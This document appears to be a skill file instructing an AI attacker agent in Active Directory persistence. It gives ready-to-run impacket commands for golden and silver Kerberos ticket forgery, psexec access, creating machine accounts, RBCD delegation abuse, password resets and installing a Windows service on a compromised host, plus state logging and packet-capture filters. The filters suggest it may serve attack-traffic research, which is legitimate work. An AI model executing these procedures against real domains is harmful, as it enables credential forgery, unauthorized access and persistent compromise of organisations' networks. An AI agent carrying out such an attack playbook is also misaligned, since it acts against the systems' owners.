---
name: ad-persistence
description: Persistence-phase Active Directory skill for an attacker agent on a domain-joined Windows host. Covers golden/silver tickets, adding a machine account, and service persistence. persistence.rbcd and persistence.reset-password are forbidden. Load this skill when the task names ad-persistence. Scripts and state.json live in the shared ad-attack skill. Every task must write a display-filter-only {task_id}.txt via write_filter.py.
---

# AD Persistence Skill

Load this skill **only** when the dispatched task names `ad-persistence`. Do not load other phase catalogs.

**Shared runtime.** `cd` to `~/.config/opencode/skills/ad-attack` (or the packaged `attacker/skills/ad-attack`) before any `python scripts/...` call. Follow the Mandatory Execution Protocol in the `ad-attack` skill, including Step 5 (write `{task_id}.txt`).

**Traffic filter contract.** Time-window slicing is a later extract step. This skill writes **only** a Wireshark display filter — never a tshark command, never `frame.time_epoch`. Host-local techniques with no packets use `frame.number == 0`.

# Phase 5: Persistence

## 5.1 Golden Ticket

- Technique id: `persistence.golden-ticket`
- ATT&CK: T1558.001 (Steal or Forge Kerberos Tickets: Golden Ticket)

Purpose: forge a TGT signed with the `krbtgt` hash for long-term domain access.

Inputs: the `krbtgt` user object's `ntlm_hash`, `domain.domain_sid`, `domain.name`.

Procedure (one atomic action):

```
python -m impacket.examples.ticketer -nthash <krbtgt-hash> -domain-sid <domain.domain_sid> -domain <domain.name> <username>
```

Use the forged ticket:

```
$env:KRB5CCNAME = "<username>.ccache"
python -m impacket.examples.psexec -k -no-pass <domain.name>/<username>@<domain.dc_fqdn>
```

Outputs:

```
python scripts/state.py add tickets.golden '{"principal": "<username>", "ccache_file": "<username>.ccache"}'
```

Rollback: if the ticket is rejected, the `krbtgt` hash or SID is stale — `mark-stale` the `krbtgt` user object / `domain.domain_sid` and re-run DCSync.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
(ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (kerberos || tcp.port == 88 || udp.port == 88)) || (ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (smb || msrpc || tcp.port == 445 || tcp.port == 135))
```


## 5.2 Silver Ticket
- Technique id: `persistence.silver-ticket`
- ATT&CK: T1558.002 (Steal or Forge Kerberos Tickets: Silver Ticket)

Purpose: forge a service ticket signed with a specific service account hash.

Inputs: a service account user object's `ntlm_hash`, `domain.domain_sid`, `domain.name`, target `spn`.

Procedure (one atomic action):

```
python -m impacket.examples.ticketer -nthash <service-hash> -domain-sid <domain.domain_sid> -domain <domain.name> -spn <spn> <username>
```

Use it against that service:

```
$env:KRB5CCNAME = "<username>.ccache"
python -m impacket.examples.psexec -k -no-pass <domain.name>/<username>@<target-fqdn>
```

Common SPNs: `cifs/<host-fqdn>`, `HOST/<host-fqdn>`, `ldap/<dc-fqdn>`.

Outputs:

```
python scripts/state.py add tickets.silver '{"spn": "<spn>", "principal": "<username>", "ccache_file": "<username>.ccache"}'
```

Rollback: if rejected, `mark-stale` the service account user object and re-run `credential.dump-secrets`.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (kerberos || smb || msrpc || tcp.port == 88 || tcp.port == 445 || tcp.port == 135)
```


## 5.3 Create Machine Account
- Technique id: `persistence.add-computer`
- ATT&CK: T1136.002 (Create Account: Domain Account)

Purpose: add a machine account (default MAQ permits it) for later RBCD/delegation.

Inputs: `domain.name`, `domain.dc_ip`, an account with `password` from `users`, and `campaign.machine_account` (the chosen name + password). If `campaign.machine_account` is empty, decide an attacker-chosen computer name and password, store them in `campaign.machine_account`, then run the command. Adding a new machine account is allowed; it does not modify any existing account.

Procedure (one atomic action):

```
python -m impacket.examples.addcomputer -computer-name '<campaign.machine_account.name>' -computer-pass '<campaign.machine_account.password>' -dc-ip <domain.dc_ip> <domain.name>/<user>:<password>
```

Outputs:

```
python scripts/state.py add users '{"username": "<campaign.machine_account.name>", "password": "<campaign.machine_account.password>", "is_machine_account": true, "source": "persistence.add-computer"}'
python scripts/changes.py add '{"kind": "create_machine_account", "technique_id": "persistence.add-computer", "target": "<campaign.machine_account.name>", "summary": "Created machine account <campaign.machine_account.name>", "reversal": "Remove-ADComputer -Identity <campaign.machine_account.name>"}'
```

Rollback: if the machine account no longer works, `mark-stale` it and re-create.

## 5.4 Resource-Based Constrained Delegation (RBCD)

> **RESTRICTED — DO NOT EXECUTE.** Granting RBCD writes `msDS-AllowedToActOnBehalfOfOtherIdentity` on an existing computer account, which is an in-place modification of existing AD account info and is forbidden by the domain mutation constraints. If a task names `persistence.rbcd`, mark the technique `failed` in `state.json` with reason `forbidden by domain mutation constraints` and end the task.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (ldap || smb || tcp.port == 389 || tcp.port == 445)
```

- Technique id: `persistence.rbcd`
- ATT&CK: T1098 (Account Manipulation), T1558.005

Purpose: grant a machine account the right to impersonate on a target computer (RBCD).

Inputs: the machine account from `campaign.machine_account`, the target computer `$` name from `hosts[].machine_account` (populated by `discovery.host-identify`), `domain.dc_ip`, and an account with write DACL on the target.

Procedure (one atomic action):

```
python -m impacket.examples.rbcd -delegate-from '<campaign.machine_account.name>' -delegate-to '<target-machine-account>' -dc-ip <domain.dc_ip> -action write <domain.name>/<user>:<password>
```

Then obtain a ticket impersonating an admin:

```
python -m impacket.examples.getST -spn cifs/<target-fqdn> -impersonate <admin> -dc-ip <domain.dc_ip> <domain.name>/<campaign.machine_account.name>:<campaign.machine_account.password>
```

Outputs:

```
python scripts/state.py add domain.rbcd '{"delegate_from": "<campaign.machine_account.name>", "delegate_to": "<target-machine-account>"}'
python scripts/state.py add tickets.service '{"spn": "cifs/<target-fqdn>", "principal": "<admin>", "impersonated_user": "<admin>", "ccache_file": "<admin>.ccache"}'
python scripts/changes.py add '{"kind": "rbcd", "technique_id": "persistence.rbcd", "target": "<target-machine-account>", "summary": "Granted RBCD from <campaign.machine_account.name> to <target-machine-account>", "reversal": "Set-ADComputer <target-machine-account> -PrincipalsAllowedToDelegateToAccount $null"}'
```

Rollback: if the RBCD edge is revoked, `mark-stale` `domain.rbcd[n]` and re-run this technique.

## 5.5 Reset Account Password

> **RESTRICTED — DO NOT EXECUTE.** Resetting a password modifies an existing AD account in place and is forbidden by the domain mutation constraints. If a task names `persistence.reset-password`, mark the technique `failed` in `state.json` with reason `forbidden by domain mutation constraints` and end the task.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
frame.number == 0
```

- Technique id: `persistence.reset-password`
- ATT&CK: T1098 (Account Manipulation)

Purpose: reset a target account's password with admin rights.

Inputs: an admin account with `password` from `users`, the target user, and the new password (a task-text intent, like the spray candidate).

Procedure (one atomic action):

```
python -m impacket.examples.smbpasswd -newpass <new> -reset <domain.name>/<admin>:<password>@<target-ip>
```

Outputs:

```
python scripts/state.py merge users[<index>] '{"password": "<new>", "stale": false}'
python scripts/changes.py add '{"kind": "reset_password", "technique_id": "persistence.reset-password", "target": "<user>", "summary": "Reset password for <user>", "reversal": "Set-ADAccountPassword -Identity <user> -Reset"}'
```

Rollback: if the reset is later reverted, `mark-stale` the user object and re-run.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
frame.number == 0
```


## 5.6 Windows Service Persistence
- Technique id: `persistence.service`
- ATT&CK: T1543.003 (Create or Modify System Process: Windows Service)

Purpose: install a new Windows service on a compromised host for persistence. This creates a host-local service and does **not** modify any existing AD account (allowed by the domain mutation constraints); record it in `changes.json`.

Inputs: an admin user object with `password` from `users`, the target host, and the service command.

Procedure (one atomic action):

```
python -m impacket.examples.wmiexec <domain.name>/<user>:<password>@<target-ip> 'sc create <svc-name> binPath= "cmd /c <command>" start= auto'
```

Outputs:

```
python scripts/state.py add files '{"path": "<svc-name>", "description": "persistence service on <target-ip>"}'
python scripts/changes.py add '{"kind": "other", "technique_id": "persistence.service", "target": "<target-ip>", "summary": "Created service <svc-name> on <target-ip>", "reversal": "sc \\\\<target-ip> delete <svc-name>"}'
```

Rollback: if the service is removed, `mark-stale` the file entry and re-create.


Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (msrpc || smb || tcp.port == 135 || tcp.port == 445)
```

